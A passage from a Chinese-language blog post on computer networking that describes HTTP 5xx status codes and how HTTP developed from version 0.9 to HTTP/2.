<h4 id="503-Service-Unavaila"><a href="#503-Service-Unavaila" class="headerlink" title="503 Service Unavaila"></a>503 Service Unavaila</h4><p>服务器没有准备好处理请求。常见原因是服务器因维护或重载而停机。请注意，与此响应一起，应发送解释问题的用户友好页面。这个响应应该用于临时条件和 Retry-After：如果可能的话，HTTP 头应该包含恢复服务之前的估计时间。网站管理员还必须注意与此响应一起发送的与缓存相关的头部，因为这些临时条件响应通常不应被缓存。</p>
<h4 id="504-Gateway-Timeout"><a href="#504-Gateway-Timeout" class="headerlink" title="504 Gateway Timeout"></a>504 Gateway Timeout</h4><p>当服务器作为网关，不能及时得到上游服务器响应时返回此错误代码。</p>
<h4 id="505-HTTP-Version-Not-Supported"><a href="#505-HTTP-Version-Not-Supported" class="headerlink" title="505 HTTP Version Not Supported"></a>505 HTTP Version Not Supported</h4><p>服务器不支持请求中所使用的 HTTP 协议版本。</p>
<h4 id="506-Variant-Also-Negotiates"><a href="#506-Variant-Also-Negotiates" class="headerlink" title="506 Variant Also Negotiates"></a>506 Variant Also Negotiates</h4><p>服务器有一个内部配置错误：对请求的透明内容协商导致循环引用。</p>
<h4 id="507-Insufficient-Storage（WebDAV）"><a href="#507-Insufficient-Storage（WebDAV）" class="headerlink" title="507 Insufficient Storage（WebDAV）"></a>507 Insufficient Storage（WebDAV）</h4><p>服务器有内部配置错误：服务器无法存储完成请求所必须的内容。这种情况被认为是临时的。</p>
<h4 id="508-Loop-Detected（WebDAV）"><a href="#508-Loop-Detected（WebDAV）" class="headerlink" title="508 Loop Detected（WebDAV）"></a>508 Loop Detected（WebDAV）</h4><p>服务器在处理请求时检测到无限循环。</p>
<h4 id="510-Not-Extended"><a href="#510-Not-Extended" class="headerlink" title="510 Not Extended"></a>510 Not Extended</h4><p>客户端需要对请求进一步扩展，服务器才能实现它。服务器会回复客户端发出扩展请求所需的所有信息。</p>
<h4 id="511-Network-Authentication-Required"><a href="#511-Network-Authentication-Required" class="headerlink" title="511 Network Authentication Required"></a>511 Network Authentication Required</h4><p>指示客户端需要进行身份验证才能获得网络访问权限。</p>
<h2 id="HTTP-的发展"><a href="#HTTP-的发展" class="headerlink" title="HTTP 的发展"></a>HTTP 的发展</h2><h3 id="万维网的发明"><a href="#万维网的发明" class="headerlink" title="万维网的发明"></a>万维网的发明</h3><p>超文本传输系统起初被命名为 Mesh，在 1990 年项目实施期间被更名为万维网（World Wide Web）。它在 TCP/IP 协议基础上建立，由四个部分组成：</p>
<ul>
<li><p>一个用来表示超文本文档的文本格式，超文本标记语言（HTML）。</p>
</li>
<li><p>一个用来交换超文本文档的简单协议，超文本传输协议（HTTP），它是应用层协议，默认端口 80。</p>
</li>
<li><p>一个显示（以及编辑）超文本文档的客户端，即网络浏览器。第一个网络浏览器被称为 WorldWideWeb。</p>
</li>
<li><p>一个服务器用于提供可访问的文档，即 httpd 的前身。</p>
</li>
</ul>
<h3 id="HTTP-0-9-单行协议"><a href="#HTTP-0-9-单行协议" class="headerlink" title="HTTP/0.9 - 单行协议"></a>HTTP/0.9 - 单行协议</h3><p>初版 HTTP 协议没有版本号，后来它的版本号被定为 0.9 以区分后来的版本。HTTP/0.9 极其简单：请求由单行指令构成，以唯一可用方法 GET 开头，其后跟目标资源的路径。</p>
<p><code>GET /mypage.html</code></p>
<p>响应也极其简单，仅包含 HTML 文档本身。</p>
<p>HTTP/0.9 的响应并不包含 HTTP 头，这意味着只有 HTML 文档可以传送，无法传输其他类型文件，也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的 HTML 文件将被发回，供人们查看。</p>
<h3 id="HTTP-1-0-构建可扩展性"><a href="#HTTP-1-0-构建可扩展性" class="headerlink" title="HTTP/1.0 - 构建可扩展性"></a>HTTP/1.0 - 构建可扩展性</h3><p>HTTP/0.9 协议应用十分有限，浏览器和服务器迅速扩展内容使其用途更广：</p>
<ul>
<li><p>协议版本信息随着每个请求发送。</p>
</li>
<li><p>状态码会在响应开始时发送，使浏览器能了解请求执行的状态，并根据状态调整行为。</p>
</li>
<li><p>引入了 POST 与 HEAD 方法。</p>
</li>
<li><p>引入 HTTP 头部概念，允许传输元数据，使协议变得灵活，更具扩展性。</p>
</li>
<li><p>通过使用 HTTP 的 Content-Type 头部，具备了传输 HTML 文档以外其他类型文档的能力。</p>
</li>
</ul>
<p>HTTP/1.0 的主要缺点是每个 TCP 连接只能发送一个请求。数据发送完毕，连接就关闭，如果还要请求其他资源，必须再新建一个连接。TCP 连接建立成本很高，要经过三次握手，且建立之初发送速率慢。</p>
<h3 id="HTTP-1-1-标准化的协议"><a href="#HTTP-1-1-标准化的协议" class="headerlink" title="HTTP/1.1 - 标准化的协议"></a>HTTP/1.1 - 标准化的协议</h3><p>HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，故修订了 HTTP 的第一个标准化版本 HTTP/1.1。</p>
<p>HTTP/1.1 消除了大量歧义内容并引入了多项改进：</p>
<ul>
<li><p>连接可以复用，节省了加载网页文档资源时多次建立 TCP 连接耗费的时间。（对于同一个域名，大多数浏览器允许同时建立 6 个持久连接）。</p>
</li>
<li><p>增加了 PUT、PATCH、HEAD、OPTIONS、DELETE 方法。</p>
</li>
<li><p>增加管道技术，允许在第一个响应被完全发送前发送第二个请求，以降低通信延迟。（被证明难以实现，已被 HTTP/2 的多路复用技术取代）</p>
</li>
<li><p>支持响应分块。</p>
</li>
<li><p>引入额外的缓存控制机制。</p>
</li>
<li><p>引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交互。</p>
</li>
<li><p>引入 Host 头，可以使不同域名配置在同一个 IP 地址的服务器上</p>
</li>
</ul>
<p>HTTP/1.1 中虽然允许连接复用与管道机制，但管道机制仅增加了请求效率，服务器响应还是要依次序进行，若前面的响应很慢，后面就会有许多请求排队等待。这就是“队头阻塞”（Head-of-line blocking）。为了避免队头阻塞，产生了许多网页优化技巧，如合并脚本与样式表、图片嵌入 CSS 代码、域名分片等。若 HTTP 协议设计得更好，这些额外的工作是可以避免的。</p>
<h3 id="HTTP-2-更优异的表现"><a href="#HTTP-2-更优异的表现" class="headerlink" title="HTTP/2 - 更优异的表现"></a>HTTP/2 - 更优异的表现</h3><p>由于网页逐渐变得复杂，甚至演变为独有的应用，HTTP/1.1 的性能堪忧，谷歌通过实验性的 SPDY 协议，解决了响应数量的增加和复杂的数据传输问题，SPDY 成为了 HTTP/2 协议的基础。</p>
<p>HTTP/2 的优化：</p>
<ul>
<li><p>HTTP/2 是二进制协议而不是文本协议。信息都封装在帧中，不再可读，也不可无障碍地手动创建。</p>
</li>
<li><p>支持多路复用。并行请求能在同一个 TCP 连接中处理，不再受 HTTP/1.x 中顺序和队头阻塞的约束。（取代了管道机制）</p>
</li>
<li><p>数据流。</p>
<p>由于 HTTP/2 的数据包不是按顺序发送的，同一个连接里面连续的数据包，可能属于不同的响应。因此，必须对数据包做标记，指出它属于哪个响应。</p>
<p>每个请求或响应的所有数据包，就称为一个数据流（stream）。每个数据流都有 ID，请求数据流 ID 一律为奇数，响应数据流 ID 一律为偶数。</p>
<p>数据流发送到一半时，还可以发送 RST_STREAM 帧，取消数据流，而 HTTP/1.1 就只能关闭连接来取消了。HTTP/2 可以保持连接打开的状态而取消某个请求。甚至还可以指定数据流优先级，让服务器先响应优先级高的数据流。</p>
</li>
<li><p>压缩了头部。因为头部在一系列请求中常常是相似的，移除头部重复部分，节约了传输重复数据的带宽。</p>
</li>
<li><p>允许服务器通过推送机制在客户端缓存中填充数据，如 HTTP/1.1 中，解析 HTML 源码发现静态资源，再去请求静态资源，而 HTTP/2 可以主动把静态资源随 HTML 页面发送给客户端。</p>
</li>
</ul>
<p>HTTP/2 能够迅速普及，因为 HTTP/2 不需要站点与应用做出改变：使用 HTTP/1.1 或 HTTP/2 对他们来说是透明的。只要服务器与浏览器进行更新就足够了。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
</search>
